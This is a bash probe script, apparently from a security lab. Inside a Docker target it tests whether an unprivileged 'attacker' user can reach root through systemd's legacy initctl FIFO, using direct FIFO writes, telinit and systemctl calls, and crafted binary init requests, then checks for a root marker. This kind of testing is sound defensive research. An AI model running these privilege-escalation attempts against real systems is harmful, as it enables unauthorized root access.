#!/usr/bin/env bash
set -Eeuo pipefail

TARGET="${1:-${TARGET:-ubuntu24-server-lpe-target}}"
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
WORKSPACE="$(cd -- "$SCRIPT_DIR/.." && pwd)"
LOG="$WORKSPACE/logs/systemd-initctl-legacy.out"

mkdir -p "$(dirname -- "$LOG")"
: > "$LOG"
exec > >(tee -a "$LOG") 2>&1

echo "systemd initctl legacy FIFO probe"
echo "target=$TARGET"
date '+%Y-%m-%dT%H:%M:%S%z'

docker exec -i "$TARGET" bash <<'TARGET_SCRIPT'
set -Eeuo pipefail
set +e

ROOT_MARKER=/root/systemd_initctl_legacy_root
rm -f "$ROOT_MARKER"

section() {
  printf '\n## %s\n' "$1"
}

section "default package/service proof"
cat /etc/os-release | sed -n '1,8p'
uname -a
id attacker
dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' \
  systemd systemd-sysv util-linux 2>&1 | sort
systemctl cat systemd-initctl.socket systemd-initctl.service | sed -n '1,220p'
systemctl status systemd-initctl.socket systemd-initctl.service --no-pager -l | sed -n '1,180p' || true
stat -Lc '%A %a %U:%G %F %n' /run/initctl /dev/initctl 2>&1 || true
ls -l /sbin/telinit /sbin/init /usr/bin/systemctl 2>&1 || true

section "uid1001 direct FIFO and telinit attempts"
runuser -u attacker -- bash -lc '
set +e
id
for p in /run/initctl /dev/initctl; do
  printf "write %s -> " "$p"
  timeout 2 bash -c "printf x > \"\$1\"" sh "$p" 2>&1
  echo "rc=$?"
done
for cmd in "telinit q" "telinit u" "telinit 3" "systemctl daemon-reload" "systemctl isolate multi-user.target"; do
  echo "### $cmd"
  timeout 6 bash -lc "$cmd" 2>&1
  echo "rc=$?"
done
'

section "legacy request shape smoke"
python3 - <<'PY'
import os, struct, subprocess

payloads = [
    b"\0" * 384,
    b"INIT" + b"\0" * 380,
    struct.pack("iiii", 0x03091969, 0, 0, 0) + b"\0" * 368,
]
for i, payload in enumerate(payloads):
    path = f"/tmp/systemd-initctl-legacy-{i}.bin"
    with open(path, "wb") as f:
        f.write(payload)
    os.chown(path, 1001, 1001)
    print(f"payload {i} size={len(payload)}")
    cp = subprocess.run(
        ["runuser", "-u", "attacker", "--", "bash", "-lc", f"timeout 2 cat {path} > /run/initctl"],
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    print(cp.stdout.strip())
    print("rc", cp.returncode)
    os.unlink(path)
PY

section "root proof and cleanup"
if [ -e "$ROOT_MARKER" ]; then
  echo ROOT_PROOF=yes
  stat -Lc '%A %U:%G %n' "$ROOT_MARKER"
  cat "$ROOT_MARKER"
else
  echo ROOT_PROOF=no
fi
rm -f "$ROOT_MARKER"
systemctl reset-failed systemd-initctl.socket systemd-initctl.service >/dev/null 2>&1 || true
systemctl is-system-running || true
systemctl --failed --no-legend || true

TARGET_SCRIPT
